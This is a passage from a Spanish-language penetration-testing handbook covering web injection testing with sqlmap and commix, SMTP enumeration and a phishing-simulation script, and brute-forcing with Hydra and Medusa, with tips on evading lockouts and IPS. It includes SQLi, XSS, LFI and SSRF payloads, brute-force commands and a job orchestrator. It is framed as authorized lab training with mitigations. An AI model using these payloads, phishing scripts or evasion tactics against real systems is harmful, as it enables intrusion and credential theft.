> Todo el contenido de este capítulo está destinado únicamente a **laboratorios controlados** o a activos para los que se posee autorización **escrita y documentada**. Ejecutar exploits o automatizar ataques contra sistemas sin permiso es ilegal. Antes de cualquier actividad: firmar RoE, tomar snapshots, coordinar contactos de emergencia y documentar todo.

---

## 1. Panorama de vulnerabilidades web frecuentes

* **SQL Injection (SQLi):** inserción de payloads en parámetros que se concatenan en consultas SQL. Impacto: acceso a base de datos, extracción de datos.
* **Cross-Site Scripting (XSS):** inyección de scripts en páginas; impacto: robo de cookies, pivot vía navegador.
* **Remote Code Execution (RCE) / Command Injection:** ejecución arbitraria de comandos en servidor (alto impacto).
* **Local File Inclusion (LFI) / Remote File Inclusion (RFI):** lectura/ejecución de archivos locales/remotos.
* **Server-Side Request Forgery (SSRF):** servidor hace peticiones a recursos internos/externos.
* **Insecure Deserialization, File Upload vulnerabilities, Auth flaws, Broken Access Control.**

Para cada vulnerabilidad hay que evaluar: **impacto**, **exploitability**, **probabilidad** y **detectabilidad** (si el Blue Team observará el intento).

---

## 2. Workflow seguro y reproducible (recon → prueba → evidencia → remediación)

1. **Recolectar objetivos**: URLs, parámetros, métodos (GET/POST), headers relevantes (Authorization, cookies). Exportar tráfico a Burp or to a structured list (`targets_urls.txt`).
2. **Identificación pasiva**: revisar HTML, formularios, JS, endpoints API; buscar parámetros `id`, `q`, `search`, `page`, `cmd`, `file`, `url`, `redirect`.
3. **Pruebas automatizadas con límites**: ejecutar scanners automatizados sólo sobre endpoints autorizados, con `--batch/--level` controlado, y con `--risk`/`--threads` bajos.
4. **Verificación manual en Burp**: interceptar, manipular requests, observar respuestas; usar Burp Intruder/Repeater para pruebas controladas.
5. **Captura de evidencia**: respuesta completa, status code, proof-of-concept (no destructivo), timestamp, hashes, request/response pair (raw).
6. **Reporte**: descripción, PoC, impacto, pasos de mitigación y priorización.
7. **Cleanup**: si se generó algún cambio (ficheros de prueba, cuentas), revertirlo y registrar la acción.

---

## 3. Burp Suite: uso operativo para verificación manual

* **Proxy → Repeater → Intruder**: intercepta peticiones, modifica parámetros con Repeater para pruebas iterativas; Intruder para cadenas controladas (usar pequeño número de payloads y `throttle`).
* **Logger + Save**: guardar todo en un proyecto y exportar solicitudes/respuestas relevantes como evidencia.
* **Extensiones útiles:** `burp-bounty`, `Logger++`, `ActiveScan++` (solo en Pro y dentro de RoE).
* **Burp Collaborator**: para detección de SSRF/OOB (out-of-band). Usar Collaborator desde Burp Pro para mostrar interacción del servidor hacia recursos controlados por el tester.

**Práctica segura:** cuando reproduzcas XSS/SQLi, usa payloads no destructivos que demuestren control pero no extraigan datos sensibles — por ejemplo, inyectar identificadores únicos de prueba y observar su eco en la respuesta.

---

## 4. SQLi — detección y verificación (con `sqlmap`)

**Principio:** primero confirmar la presencia de inyección con pruebas no destructivas; luego, si está en RoE, usar `sqlmap` con máximos controles (read-only, límites).

**Ejemplo de flujo con `sqlmap` (uso responsable):**

1. Generar request interceptado en Burp y exportarlo (`req.txt`) o construir URL con parámetro vulnerable: `http://lab.local/item?id=1`.
2. Ejecutar `sqlmap` en modo mínimo para confirmar (no dump completo):

```bash
sqlmap -r req.txt --batch --level=1 --risk=1 --technique=BE --threads=1 --dbs --stop=1
```

Explicaciones:

* `-r req.txt`: request interceptado (con headers).
* `--batch`: sin prompts (usar con cuidado).
* `--level`/`--risk`: ajustar bajo en pruebas iniciales.
* `--stop=1`: parar después de encontrar la primera evidencia.
* `--technique=BE`: elegir técnicas concretas (p. ej. boolean-based); en laboratorio puedes ampliar.

**PoC no destructivo (ejemplo conceptual):** inyectar payloads booleanos que no alteren la DB y observar respuestas. Evitar `--dump` o `--os-shell` salvo con autorización explícita.

---

## 5. Command Injection & `commix` (uso controlado)

`commix` automatiza la detección y explotación de command injection en parámetros. **Usar solo** en entornos de laboratorio. Ejemplo controlado:

```bash
# request guardado en req.txt
commix --request=req.txt --batch --technique=1 --safe-string="YOU_SHALL_NOT_PASS" --timeout=10
```

* `--safe-string` permite usar marcadores no destructivos.
* `--batch` evita prompts; preferir revisión manual de los vectores detectados.

**Nota:** no utilizar `--os-shell` o `--reverse-shell` en entornos no autorizados. `commix` es muy potente y peligroso.

---

## 6. Workflows y scripts de orquestación (Bash + Python)

Proporciono plantillas para integrar descubrimiento y verificación **con límites**. Siempre revisa outputs antes de continuar a etapas más intrusivas.

### A) Script Bash: generar lista de endpoints y lanzar pruebas iniciales no intrusivas

`web_sanity_check.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail
TARGETS=${1:-targets_urls.txt}
OUTDIR=${2:-./web_checks}
mkdir -p "$OUTDIR"
while IFS= read -r u; do
  echo "Checking $u"
  # Obtener método y parámetros simples (HEAD)
  status=$(curl -Is -m 10 -A "LabChecker/1.0" "$u" | head -n1 | sed 's/HTTP\/1.1 //')
  echo "$u,$status" >> "$OUTDIR/status.csv"
  # Probar reflexión simple para XSS (non destructive): insertar token en param 'q' si existe
  if echo "$u" | grep -q 'q='; then
    token="LABXSS$(date +%s)"
    testurl=$(echo "$u" | sed "s/q=[^&]*/q=${token}/")
    body=$(curl -s -m 10 -A "LabChecker/1.0" "$testurl")
    echo "$body" | grep -q "$token" && echo "$u,reflects,$token" >> "$OUTDIR/xss_checks.csv" || true
  fi
done < "$TARGETS"
echo "Done. Results in $OUTDIR"
```

Este script realiza chequeos básicos: status codes y una prueba simple de reflexión en parámetros `q`. No es intrusivo.

### B) Python: wrapper para lanzar `sqlmap`/`commix` con control (dry-run y limit)

`exploit_orchestrator.py` (esqueleto)

```python
#!/usr/bin/env python3
import subprocess, shlex, os, json, time
CONFIG_FILE='exploit_plan.json'  # contiene list of targets and permitted tests

def run_sqlmap(reqfile, outdir, level=1):
    cmd = f"sqlmap -r {reqfile} --batch --level={level} --risk=1 --threads=1 --stop=1"
    proc = subprocess.run(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    with open(os.path.join(outdir,'sqlmap.out'),'w') as fh:
        fh.write(proc.stdout)
    return proc.returncode, proc.stdout

def run_commix(reqfile, outdir):
    cmd = f"commix --request={reqfile} --batch --safe-string=LABSAFE --timeout=10"
    proc = subprocess.run(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    with open(os.path.join(outdir,'commix.out'),'w') as fh:
        fh.write(proc.stdout)
    return proc.returncode, proc.stdout

if __name__ == "__main__":
    # leer plan y ejecutar de uno en uno, con logs y pausas
    if not os.path.exists(CONFIG_FILE):
        print("No plan found.")
        raise SystemExit(1)
    plan = json.load(open(CONFIG_FILE))
    for item in plan.get('tests',[]):
        if not item.get('authorized'):
            print("Skipped unauthorized:", item)
            continue
        outdir = item.get('outdir','./run_'+str(int(time.time())))
        os.makedirs(outdir, exist_ok=True)
        if item['type']=='sqlmap':
            run_sqlmap(item['reqfile'], outdir, level=item.get('level',1))
        elif item['type']=='commix':
            run_commix(item['reqfile'], outdir)
        # pausa controlada entre pruebas
        time.sleep(item.get('pause',5))
```

`exploit_plan.json` debe listar objetivos y marcar `authorized: true` sólo si la prueba está aprobada.

---

## 7. Ejemplos de payloads de prueba (no destructivos) — para laboratorio

* **Prueba de inyección SQL (boolean-based, no dump):**

  * `' OR '1'='1' -- ` (verifica si la condición es verdadera y cambia la respuesta).
* **Prueba XSS de reflexión (payload inocuo):**

  * `<script>console.log('LAB_XSS')</script>` (busca eco en la respuesta con Burp).
* **Prueba de LFI (lectura básica de /etc/hosts):**

  * `../../../../etc/hosts` (en entornos Linux de prueba).
* **Prueba SSRF OOB (con Burp Collaborator o un domain controlado):**

  * `http://<your-collab-id>.burpcollaborator.net` (siempre con Collaborator o un dominio que controles).

**IMPORTANTE:** los payloads anteriores son ejemplos didácticos y deben usarse únicamente en entornos controlados. No ejecutar `../../../../etc/passwd` ni comandos que puedan generar ruido o destruir datos en sistemas de terceros.

---

## 8. Captura y documentación de evidencia

Para cada hallazgo guarda:

* Request raw (incluyendo headers y body).
* Response raw (headers + body).
* Timestamp y operador.
* Hash SHA256 de request/response (para integridad).
* Captura de Burp (export HAR o request/response pairs).
* CVSS estimation y categorización (impacto+exploitability).

Ejemplo: generar SHA256 de respuesta para evidencia:

```bash
curl -s -X GET 'http://lab.local/?id=1' > resp.bin
sha256sum resp.bin > resp.sha256
```

---

## 9. Mitigaciones y recomendaciones defensivas

* **Validación y parametrización** en la capa de acceso a datos (queries parametrizadas, ORM, prepared statements).
* **Escapar y sanitizar** salidas HTML para prevenir XSS (Content Security Policy, output encoding).
* **Validar uploads** y restringir tipos de ficheros; almacenar fuera del document root.
* **Harden web server**: limitar métodos HTTP, WAF con reglas para SQLi/XSS, rate-limiting.
* **Segregar APIs y aplicar allowlists para SSRF**: validar URLs o bloquear peticiones a redes internas.
* **Logging y detección**: monitorizar patrones de inyección, uso de Burp/Intruder-like patterns (requests con payloads anómalos), correlación en SIEM.
* **Defensa en profundidad**: least privilege en DB users (no usar cuentas con `DROP`/`DELETE` si no necesario), rotating credentials, MFA en admin panels.

---

## 10. Checklist rápido para pruebas web (seguras)

* [ ] Autorización escrita y alcance listado (endpoints permitidos).
* [ ] Snapshots o backups antes de pruebas intrusivas.
* [ ] Lista de tests autorizados y scripts de control (`exploit_plan.json`).
* [ ] Uso de Burp con proyecto guardado y export de evidencias.
* [ ] Tests automated con `sqlmap`/`commix` limitados (`--stop`, `--risk`, `--level` bajos).
* [ ] Captura de request/response y generación de hashes para integridad.
* [ ] Informe con PoC no destructiva, mitigaciones y prioridad según impacto.

---

# Capítulo 20 — Ataques a correo y servicios SMTP/IMAP

**Enumeración y phishing técnico. (Envío masivo simulado con Python)**

**Objetivos**

* Comprender la superficie de ataque relacionada con correo: SMTP, IMAP, POP3, servicios de retransmisión y vectores de phishing técnico.
* Aprender técnicas de enumeración seguras de servidores de correo y cuentas (verificación de usuarios, VRFY/EXPN, banner grabbing) usando herramientas de laboratorio.
* Diseñar y ejecutar simulaciones de campañas de phishing técnico **controladas** para testing defensivo (uso de entornos de captura como MailHog, Mailcatcher o servidores SMTP locales).
* Proveer ejemplos reproducibles en Bash y Python que **no** envíen correos a terceros por defecto: modos de `dry-run` y generación de mensajes EML para revisión.
* Incluir recomendaciones de mitigación: SPF, DKIM, DMARC, rate-limiting, autenticación y detección.

> **AVISO ÉTICO-LEGAL (OBLIGATORIO).**
> Todo lo de este capítulo es para **uso defensivo en laboratorios** o para ejercicios autorizados. Realizar phishing, enumeración de cuentas o envío masivo a destinatarios reales sin permiso es ilegal y dañino. Antes de cualquier prueba obtén autorización escrita, define telemetría, ventanas y contactos de respuesta. Usa entornos de pruebas (MailHog, Mailtrap, cuentas de prueba) o el modo `dry-run` de los scripts que se proponen.

---

## Conceptos y vectores relevantes

* **SMTP (Simple Mail Transfer Protocol):** protocolo para entrega de correo (puerto típico 25, 587, 465(SMTPS)). Banner y extensiones (EHLO) informan capacidades.
* **IMAP/POP3:** protocolos para acceso a buzones (IMAP 143/993, POP3 110/995). Pueden exponer versiones y permitir enumeración.
* **VRFY/EXPN/RCPT TO:** comandos SMTP que en servidores mal configurados permiten verificar existencia de usuarios. Modernos servidores suelen deshabilitarlos.
* **Open relay:** servidor que acepta reenviar correo a cualquier destino; importante para abuse.
* **Phishing técnico:** envío de mensajes que buscan engañar a usuarios o provocar acciones (clics, envío de credenciales, ejecución de attachments). En pruebas defensivas se simulan con landing pages controladas y dominios/aliases de prueba.
* **SPF/DKIM/DMARC:** mecanismos para validar remitente y detectar spoofing; siempre revisa antes de simular campañas para entender por qué mails podrían ser bloqueados.

---

## Herramientas de enumeración y detección (uso permitido en scope)

* `nmap` con scripts SMTP/IMAP: `smtp-enum-users`, `smtp-commands`, `imap-capabilities`.
* `smtp-user-enum` (cuando esté permitido) para verificar existencia de cuentas (mode `--test` or `--no-brute`).
* `swaks` (Swiss Army Knife for SMTP) para probar envío y comportamiento del servidor.
* `openssl s_client` para interacción TLS con puerto SMTPS/IMAPS.
* `fetchmail`/`imaplib`/`telnet` para pruebas manuales en IMAP.
* Servicios de captura local: **MailHog**, **Mailtrap**, **Mailcatcher**, o un Postfix local configurado para entregar a Maildir de pruebas.

**Recordá**: nociones como VRFY o RCPT pueden estar deshabilitadas en producción; procurar siempre entornos de laboratorio.

---

## Enumeración segura — ejemplos prácticos

### 1) Banner grabbing y EHLO (manual, Bash / openssl)

```bash
# Conexión simple (sin TLS) a SMTP
nc -vn smtp.example.com 25
# o con TLS explícito a SMTPS (465)
openssl s_client -connect smtp.example.com:465 -crlf
# Ejemplo de interacción:
# EHLO lab.local
# 250-PIPELINING
# 250-SIZE 10240000
# 250-STARTTLS
# 250 AUTH PLAIN LOGIN
```

Leer capabilities (250- lines) para saber si `VRFY`/`EXPN` están soportados o si `AUTH` está disponible.

### 2) nmap SMTP/IMAP scripts (no intrusivo)

```bash
# SMTP banner + scripts
nmap -sV -p 25,587,465 --script=smtp-commands,smtp-enum-users --script-args='smtp-enum-users.methods={VRFY,EXPN,RCPT}' target.com -oN scans/smtp_enum.txt

# IMAP capabilities
nmap -p 143,993 --script=imap-capabilities target.com -oN scans/imap_caps.txt
```

**Precaución:** `smtp-enum-users` puede impresionar como intento de enumeración; ejecutar sólo con autorización.

### 3) swaks para probar RCPT/VRFY (modo no destructivo)

```bash
# probar RCPT TO sin realmente enviar body (ver cómo responde)
swaks --to test@example.com --server smtp.example.com --port 25 --quit-after RCPT
```

`swaks` es excelente para pruebas controladas y scripting. Usa `--quit-after` para no intentar completar envío.

---

## Phishing técnico — diseño seguro de una simulación

Un ejercicio defensivo típico incluye:

1. **Dominios/aliases controlados**: crea un dominio de laboratorio o subdominio `lab-phish.example.com`.
2. **Landing pages controladas**: la página donde "cae" el usuario debe estar en entorno de laboratorio y registrar clicks sin capturar credenciales reales (mejor: mostrar mensaje de prueba).
3. **Mail server de pruebas**: usar MailHog/Mailtrap para interceptar correos; no enviar a cuentas reales.
4. **Contenido del correo**: plantillas con identificadores únicos (tokens) por destinatario para tracking. Evitar artefactos maliciosos (adjuntos ejecutables).
5. **Métricas**: tasa de entrega, tasa de apertura (imágenes tracking dentro de laboratorio), clics en links controlados, respuestas.
6. **Informes y retroalimentación**: notificar a responsables y diseñar plan de entrenamiento/simulación.

---

## Simulación de envío masivo **seguro** con Python

Abajo hay **dos** enfoques: A) generación de mensajes EML (no se envía nada; para revisión), y B) envío real **solo** si se configura explícitamente un SMTP de laboratorio (MailHog/localhost) y se define `SEND_REAL=true` en variables de entorno. Por defecto el script actúa en `dry-run` y **no** envía correos a Internet.

Guarda como `phish_simulator.py`.

```python
#!/usr/bin/env python3
"""
phish_simulator.py
- Genera mensajes EML por destinatario (modo por defecto: dry-run, no enviar).
- Si se define SEND_REAL=1 y SMTP_SERVER está configurado y autorizado (ej. MailHog localhost:1025), se enviarán los correos.
USO (dry-run): python3 phish_simulator.py recipients.csv
Formato recipients.csv: email,name
"""
import csv, os, sys, uuid, time
from email.message import EmailMessage
from email.utils import formataddr
import smtplib

OUTDIR = os.environ.get("OUTDIR", "./phish_eml")
SMTP_SERVER = os.environ.get("SMTP_SERVER", "localhost")
SMTP_PORT = int(os.environ.get("SMTP_PORT", "1025"))  # MailHog default port
SEND_REAL = os.environ.get("SEND_REAL", "0") == "1"

TEMPLATE = """\
Subject: [LAB] Actualización de seguridad pendiente - {name}
From: "Security Team" <security@lab-phish.example.com>
To: {email}

Hola {name},

Esto es una simulación de phishing para fines de entrenamiento. Por favor NO introduzcas credenciales reales.

Haz clic en el siguiente enlace controlado para completar la verificación:
{link}

Token de prueba: {token}

Saludos,
Equipo de Seguridad (lab)
"""

def make_message(name, email, token, link):
    msg = EmailMessage()
    msg['Subject'] = f"[LAB] Actualización de seguridad pendiente - {name}"
    msg['From'] = formataddr(("Security Team", "security@lab-phish.example.com"))
    msg['To'] = email
    body = TEMPLATE.format(name=name, email=email, token=token, link=link)
    msg.set_content(body)
    return msg

def save_eml(msg, outdir, filename):
    path = os.path.join(outdir, filename)
    with open(path, 'wb') as f:
        f.write(msg.as_bytes())
    return path

def send_via_smtp(msg, server, port):
    with smtplib.SMTP(server, port, timeout=10) as s:
        # For MailHog no auth needed; for other servers configure auth carefully and only in lab
        s.send_message(msg)

def main(recipients_csv):
    os.makedirs(OUTDIR, exist_ok=True)
    with open(recipients_csv, newline='', encoding='utf-8') as fh:
        reader = csv.DictReader(fh)
        for row in reader:
            email = row.get('email') or row.get('Email') or row.get('to')
            name = row.get('name') or row.get('Name') or email.split('@')[0]
            token = str(uuid.uuid4())
            link = f"https://lab-phish.example.com/track?token={token}"
            msg = make_message(name, email, token, link)
            fname = f"{int(time.time())}_{email.replace('@','_at_')}.eml"
            saved = save_eml(msg, OUTDIR, fname)
            print(f"[DRY] Generated EML for {email} -> {saved}")
            if SEND_REAL:
                # *** Real sending only to lab SMTP (MailHog) or authorized server ***
                try:
                    send_via_smtp(msg, SMTP_SERVER, SMTP_PORT)
                    print(f"[SENT] {email} via {SMTP_SERVER}:{SMTP_PORT}")
                except Exception as e:
                    print(f"[ERROR] sending to {email}: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 phish_simulator.py recipients.csv")
        sys.exit(1)
    main(sys.argv[1])
```

**Cómo usarlo (modo seguro):**

1. Crear `recipients.csv` con encabezado `email,name`. Ejemplo:

   ```
   email,name
   alice@lab.local,Alice
   bob@lab.local,Bob
   ```
2. Ejecutar (dry-run): `python3 phish_simulator.py recipients.csv` — esto generará archivos `.eml` en `./phish_eml`.
3. Para enviar a MailHog local (solo lab): instalar y ejecutar MailHog (`MailHog` escucha por defecto en 1025 SMTP y 8025 UI), luego exportar `SEND_REAL=1` y `SMTP_SERVER=localhost` y ejecutar:
   `SEND_REAL=1 SMTP_SERVER=localhost SMTP_PORT=1025 python3 phish_simulator.py recipients.csv`
   MailHog mostrará los correos en su interfaz web; **no** llegan a Internet.

Este enfoque asegura que nunca se envíe por accidente un correo a destinatarios reales.

---

## Automatización de tracking y métricas (lab)

* Diseña un endpoint controlado (`/track`) que registre el `token` y el `User-Agent` y devuelva una página de aviso (no recoger credenciales).
* Guarda logs con `token, email, timestamp, ip, ua` para métricas: tasa de apertura (si embed de imagen tracking) y clics.
* No uses imágenes de tracking fuera de scope y evita recolección de PII innecesaria.

---

## Detección y mitigación defensiva (recomendaciones)

* **SPF, DKIM, DMARC:** implementar y monitorizar políticas `p=quarantine` o `p=reject` en DMARC a medida que maduras. Revisar reports agregados (RUA/RUF).
* **Rate-limiting y greylisting:** restringir cantidad de conexiones SMTP desde IPs desconocidas.
* **Autenticación y acceso IMAP/POP:** forzar MFA donde aplique; bloquear o alertar por conexiones IMAP desde ubicaciones anómalas.
* **Deshabilitar VRFY/EXPN/unauthenticated RCPT responses:** evitar divulgar existencia de accounts.
* **Open relay checks:** escanear y bloquear relays abiertos que permiten abuso.
* **Simulacros y formación:** campañas internas autorizadas para entrenar usuarios y medir efectividad (phishing simulations).
* **Monitoring:** detección de patrones de phishing por contenido, URLs, dominios similares (typosquatting), y correlación en SIEM.
* **Protección de inbound:** sandboxing de attachments, simulación de apertura en entornos aislados para análisis de malware.

---

## Checklist rápido (operacional)

* [ ] Autorización por escrito para pruebas de correo y phishing.
* [ ] Lista de dominios/aliases y servidores SMTP en scope.
* [ ] Entorno de captura configurado (MailHog / Mailtrap / Mailcatcher).
* [ ] Recipients definidos como cuentas de prueba; `recipients.csv` usado.
* [ ] Scripts en `dry-run` por defecto; `SEND_REAL` solo para lab SMTP.
* [ ] Endpoint `/track` para registro de clics y métricas sin recolectar credenciales.
* [ ] Logs y evidencia almacenados cifrados y con retención definida.
* [ ] Reporte de hallazgos con recomendaciones (SPF/DKIM/DMARC, rate-limit, training).

---

# Capítulo 21 — Fuerza bruta y credenciales: Hydra y Medusa

**Optimización, evasión de bloqueos e integración con colas (wrappers en Python)**

**Objetivos**

* Entender cuándo y por qué (no) emplear ataques de fuerza bruta o credential-stuffing en una campaña de Red Team.
* Conocer las herramientas clásicas (`hydra`, `medusa`) y cómo controlarlas de forma segura y responsable.
* Aprender técnicas para optimizar pruebas en entornos autorizados: tuning de rates, uso de proxies, rotación de credenciales y detección de lockouts/IPS.
* Proveer un wrapper en Python para gestionar una cola de tareas, aplicar backoff/exponential jitter, loguear resultados y respetar reglas de bloqueo (account lockout, rate limits).
* Incluir recomendaciones de mitigación y checklist operativo.

> **AVISO ÉTICO-LEGAL (OBLIGATORIO).**
> Los ataques de fuerza bruta, credential stuffing y pruebas automatizadas de autenticación **sólo** pueden realizarse contra sistemas para los cuales tienes **autorización escrita y documentada**. Fuera de ese alcance constituyen delito. Antes de ejecutar cualquier prueba: obtener RoE, snapshots, ventana de pruebas, contacto de emergencia y plan de rollback.

---

## 1. Panorama: cuándo usar fuerza bruta y alternativas

* **Cuándo usarla:** pruebas internas controladas, validar políticas de bloqueo, evaluar resiliencia ante credential stuffing o comprobación de contraseñas débiles en cuentas provisionales.
* **Alternativas más seguras:** password spraying (pocas contraseñas comunes contra muchas cuentas) con throttling, reviews de políticas de contraseñas, secret scanning, and pentest manual dirigido.
* **Riesgos:** bloqueo de cuentas, saturación de servicios, activación de IPS/IDS, generación de alertas operativas y daños a disponibilidad.

---

## 2. Hydra y Medusa — usos seguros y flags importantes

### Hydra (ejemplo)

`hydra` es una herramienta rápida para autenticaciones en múltiples protocolos. Ejemplo controlado y responsable (limitando concurrencia y rate):

```bash
# Ejemplo educativo: probar 2 usuarios contra ssh (lab) con throttling
hydra -L users.txt -P passwords.txt -t 2 -w 10 -f -s 22 ssh://10.0.0.5
```

Explicaciones importantes:

* `-L users.txt` lista de usuarios.
* `-P passwords.txt` lista de passwords.
* `-t 2` threads concurrentes (bajo para evitar saturación).
* `-w 10` timeout de conexión (segundos).
* `-f` parar si encuentra primeras credenciales válidas (útil para minimizar requests).
* Usa `-V` para verbose pero evita imprimir passwords sensibles en logs si no es estrictamente necesario.

### Medusa (ejemplo)

`medusa` similar, con control de concurrencia y módulos por servicio:

```bash
medusa -h 10.0.0.5 -u admin -P passwords.txt -M ssh -t 2 -T 30
```

* `-t 2` threads, `-T 30` timeout general.

**Reglas de oro:** siempre usar `-t` pequeño, `--timeout` ajustado y `--max-attempts` si la herramienta lo permite; preferir `--show-progress` y logs a fichero.

---

## 3. Técnicas para evitar disparar IPS / bloquear cuentas

1. **Throttling / Low-and-slow:** mantener concurrencia baja (`-t 1-3`) y añadir pausas entre intentos.
2. **Password spraying:** probar pocas contraseñas comunes (ej.: 5) contra muchas cuentas con largos intervalos entre intentos por cuenta. Esto reduce lockout por políticas que bloquean tras N intentos.
3. **Rotación de proxies / IPs (con cuidado legal):** usar proxies solo si el RoE lo permite; alternar IPs reduce fingerprinting pero puede violar normas o potenciar detección si se usan proxies públicos.
4. **Obedecer lockout feedback:** detectar 401/403 vs 429/5xx; si el servidor responde con códigos de bloqueo o mensajes de lockout, detener inmediatamente.
5. **Jitter y backoff exponencial:** después de errores o detección de ralentización, aplicar backoff exponencial con jitter aleatorio para evitar patrones repetitivos.
6. **Detectar honeypots/blacklist:** si aparecen respuestas extrañas, detener la campaña y revisar.

---

## 4. Estrategia de pruebas segura (procedural)

* Definir **objetivos claros**: qué cuentas/servicios están en scope, resolución de success (qué respuesta indica éxito).
* Empezar con **simulaciones** en entorno sandbox (VMs, containers).
* Definir límites: máximo de intentos por cuenta por hora, máximo de requests por IP por minuto.
* Exigir **logs centralizados** y notificar al equipo de blue team (si parte del ejercicio).
* Parar y escalar ante cualquier indicador de daño o quejas.

---

## 5. Wrapper Python: gestor de colas, backoff y logging

El siguiente wrapper es una **plantilla** para usar `hydra`/`medusa` en modo orquestado. Funciona como dispatcher: toma jobs (host, user, password list, protocol), ejecuta la herramienta en modo controlado (`dry-run` por defecto), aplica backoff en errores, rota proxies si se configuraron, y guarda logs. **Por defecto NO ejecuta ataques reales** (dry-run). Cambia `DRY_RUN=False` sólo en laboratorio autorizado.

Guarda como `brute_orchestrator.py`.

```python
#!/usr/bin/env python3
"""
brute_orchestrator.py
- Orquesta intentos de fuerza bruta en modo controlado.
- Usa jobs.json como cola de trabajos.
- DRY_RUN=True por defecto. Cambiar con precaución.
"""
import subprocess, shlex, json, time, random, os, logging
from pathlib import Path
from datetime import datetime

# CONFIG
DRY_RUN = True  # cambiar a False SOLO en laboratorio autorizado
MAX_RETRIES = 3
BASE_BACKOFF = 5  # segundos
LOGDIR = Path("brute_logs")
LOGDIR.mkdir(exist_ok=True)

logging.basicConfig(filename=str(LOGDIR/"orchestrator.log"), level=logging.INFO,
                    format='%(asctime)s %(levelname)s %(message)s')

def load_jobs(path="jobs.json"):
    with open(path,'r',encoding='utf-8') as fh:
        return json.load(fh)

def run_command(cmd, timeout=300):
    logging.info("Running: %s", cmd)
    if DRY_RUN:
        logging.info("[DRY] Would execute: %s", cmd)
        return 0, "[DRY_RUN]", ""
    try:
        proc = subprocess.run(shlex.split(cmd), capture_output=True, text=True, timeout=timeout)
        return proc.returncode, proc.stdout, proc.stderr
    except subprocess.TimeoutExpired as e:
        logging.warning("Timeout: %s", e)
        return -1, "", str(e)

def exponential_backoff(attempt):
    # jittered exponential backoff
    base = BASE_BACKOFF * (2 ** attempt)
    jitter = random.uniform(0, base*0.3)
    wait = base + jitter
    logging.info("Backoff: sleeping %.1f seconds (attempt %d)", wait, attempt)
    time.sleep(wait)

def build_hydra_cmd(job):
    # safe defaults: low concurrency, stop on first found
    host = job['host']
    proto = job.get('proto','ssh')
    users = job.get('users_file')
    pwds = job.get('pwds_file')
    threads = job.get('threads',2)
    timeout = job.get('timeout',10)
    # example: hydra -L users.txt -P pwds.txt -t 2 -w 10 -f ssh://host
    return f"hydra -L {users} -P {pwds} -t {threads} -w {timeout} -f {proto}://{host}"

def process_job(job):
    retries = 0
    while retries <= MAX_RETRIES:
        cmd = build_hydra_cmd(job)
        code, out, err = run_command(cmd)
        # log outputs
        ts = datetime.utcnow().isoformat()
        fname = LOGDIR / f"{job['host']}_{proto_safe(job.get('proto','ssh'))}_{int(time.time())}.log"
        with open(fname,'w',encoding='utf-8') as fh:
            fh.write(f"## TIMESTAMP {ts}\n")
            fh.write("STDOUT:\n"+str(out)+"\n")
            fh.write("STDERR:\n"+str(err)+"\n")
        # basic heuristics to detect lockouts / rate limiting
        combined = (out or "") + (err or "")
        if detect_lockout(combined):
            logging.warning("Lockout detected for host %s, aborting job and escalating.", job['host'])
            return False
        if code == 0:
            logging.info("Job finished with code 0 for %s", job['host'])
            return True
        retries += 1
        exponential_backoff(retries)
    logging.error("Job exhausted retries for %s", job['host'])
    return False

def detect_lockout(output_text):
    # heuristics: look for known messages or rate-limit codes
    indicators = ["429", "rate limit", "temporarily disabled", "account locked", "too many", "blocked"]
    t = output_text.lower()
    for s in indicators:
        if s in t:
            return True
    return False

def proto_safe(proto):
    return proto.replace('/','_')

if __name__ == "__main__":
    jobs = load_jobs()
    for job in jobs.get('jobs',[]):
        logging.info("Starting job for host %s proto %s", job['host'], job.get('proto','ssh'))
        ok = process_job(job)
        if not ok:
            logging.info("Job failed or aborted: %s", job['host'])
        time.sleep(job.get('inter_job_sleep', 5))
    logging.info("All jobs processed.")
```

`jobs.json` ejemplo (plantilla):

```json
{
  "jobs": [
    {
      "host": "10.0.0.5",
      "proto": "ssh",
      "users_file": "users.txt",
      "pwds_file": "pwds.txt",
      "threads": 1,
      "timeout": 8,
      "inter_job_sleep": 10
    }
  ]
}
```

**Características del wrapper:**

* `DRY_RUN` por defecto para evitar envíos accidentales.
* Exponential backoff con jitter ante fallos.
* Detección básica de mensajes de bloqueo/ratelimit.
* Logging estructurado por job.
* Fácil de extender: añadir rotación de proxies, integración con Redis/Kafka para colas, o un dashboard de control.

---

## 6. Rotación de proxies e IPs — consideraciones legales y técnicas

* Usar proxies **solo** si el RoE lo permite y el proxy está bajo control del operador (o del cliente).
* Rotación puede evitar bloqueos por IP, pero aumenta el riesgo de detección por patrones (mismo user-agent, timing regular). Introduce variabilidad en headers y timing.
* No uses proxies públicos de terceros para ocultar actividad: es poco ético y puede violar acuerdos y leyes.

Técnicamente, el wrapper puede aceptar un `proxies.txt` y añadir `-s PROXY` flags si la herramienta lo soporta; o ejecutar comandos en un entorno que rotule IPs (VPNs controladas).

---

## 7. Detección y respuesta: cómo saber que te bloquearon o fuiste detectado

* Aumento de latencia en respuestas, códigos 429, 403 con mensajes de bloqueo.
* Cambios en comportamiento (respuestas NACK, captchas).
* Logs de SIEM/EDR reportando patrones de autenticación inusuales (múltiples fallos desde diversas IPs).
* Notificaciones de helpdesk o tickets de incidentes.

Al detectarlo: **parar inmediatamente**, escalar al cliente/equipo, preservar logs y evidence (timestamps, IPs, outputs), y ajustar plan.

---

## 8. Recomendaciones de mitigación (desde la óptica defensiva)

* Implementar **rate-limiting** en endpoints de autenticación y aplicar WAF rules para detectar patrones de fuerza bruta.
* Enforce account lockout policies razonables, con alertas y proceso de recuperación.
* **MFA**: la mejor mitigación contra credential stuffing y fuerza bruta.
* Monitorizar logs de autenticación (failed logins per account/IP) y crear alertas por anomalías.
* Implementar bloqueos progresivos y captchas con thresholds.
* Revisar políticas de password (longitud, checks against pwned lists) y forzar rotación en credenciales comprometidas.

---

## 9. Checklist operativo (previo a cualquier prueba)

* [ ] Autorización escrita (RoE) y listado de cuentas/hosts en scope.
* [ ] Definición de límites: intentos máximos por cuenta/hora, concurrencia máxima, ventana horaria.
* [ ] DRY_RUN y pruebas en laboratorio completadas.
* [ ] Snapshot/backups listos para rollback.
* [ ] Logs centralizados y contacto de emergencia comunicados.
* [ ] Plan de mitigación/rotación de credenciales en caso de acceso exitoso.
* [ ] Registro de resultados y entrega al cliente con recomendaciones.

---

# Capítulo 22 — Bypass de autenticación web

